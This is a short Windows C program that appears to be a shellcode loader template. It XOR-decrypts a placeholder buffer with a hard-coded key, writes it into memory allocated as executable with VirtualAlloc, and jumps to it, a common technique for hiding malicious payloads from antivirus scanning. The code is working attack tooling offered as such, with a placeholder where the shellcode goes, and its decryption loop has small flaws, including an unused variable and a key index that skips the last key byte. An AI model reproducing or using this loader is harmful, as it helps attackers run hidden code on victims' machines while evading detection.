#include <windows.h>
#include <stdio.h>

unsigned char buf[] = "xored_payload";

void x(char *payload, int payload_length, char *key, int length) {
	int j = 0;

	for (int i = 0; i < payload_length - 1; i++) {
		if (j == length - 1) j = 0;
		payload[i] ^= key[j];
		unsigned char data = payload[i] ^ key[j];
		j++;
	}
}

int main()
{
	char key[] = "test";
	x((char*)buf, sizeof(buf), key, sizeof(key));	
	
	//From here on out the shellcode is decrypted and can be executed
	void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, buf, sizeof(buf));
	((void(*)())exec)();
}